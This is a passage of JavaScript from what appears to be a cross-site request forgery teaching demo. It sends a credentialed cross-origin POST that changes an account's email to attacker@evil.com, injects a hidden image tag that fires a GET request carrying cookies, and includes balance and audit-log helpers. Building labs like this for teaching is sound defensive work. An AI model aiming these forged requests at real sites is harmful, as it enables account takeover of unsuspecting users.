        log(`Attempting credentialed fetch to ${target}/change-email`);

        fetch(`${target}/change-email`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "include",
          body: JSON.stringify({ email: "attacker@evil.com" }),
        })
          .then((r) => r.json())
          .then((data) => {
            if (data.success) {
              log(`✓ ATTACK SUCCEEDED: email changed to attacker@evil.com`);
            } else {
              log(`✗ ATTACK BLOCKED: ${data.error || data.detail}`);
            }
          })
          .catch((err) =>
            log(`✗ Blocked by browser CORS policy: ${err.message}`)
          );
      }

      // --- Technique 3: Image tag (GET-based state change demo) ---
      function imgAttack() {
        const target = getTarget();
        log(`Injecting <img> tag pointing to ${target}/account`);
        log("  (This endpoint is read-only — safe by design)");
        log("  In a vulnerable app, a GET-based action would fire here.");

        const img = document.createElement("img");
        img.src = `${target}/account?_=${Date.now()}`;
        img.style.display = "none";
        img.setAttribute("aria-hidden", "true");
        img.onload = () => log("  Image loaded — GET request was sent with cookies");
        img.onerror = () => log("  Image error (expected — JSON response, not an image)");
        document.body.appendChild(img);
      }

      // --- Helpers ---
      async function checkBalance() {
        const target = getTarget();
        try {
          const res = await fetch(`${target}/account`, {
            credentials: "include",
          });
          const data = await res.json();
          if (data.balance !== undefined) {
            log(`Current balance for ${data.username}: $${data.balance}`);
          } else {
            log(`Could not read balance: ${data.error}`);
          }
        } catch (err) {
          log(`Balance check failed: ${err.message}`);
        }
      }

      async function viewAuditLog() {
        const target = getTarget();
        try {
          const res = await fetch(`${target}/audit-log`);
          const entries = await res.json();
          log(`\n--- Audit log (${entries.length} entries) ---`);
          entries.slice(-5).forEach((e) => {
            log(`  ${e.event} | ${e.timestamp.slice(11, 19)} | ${JSON.stringify(e)}`);
          });
        } catch (err) {
          log(`Audit log fetch failed: ${err.message}`);
        }
      }
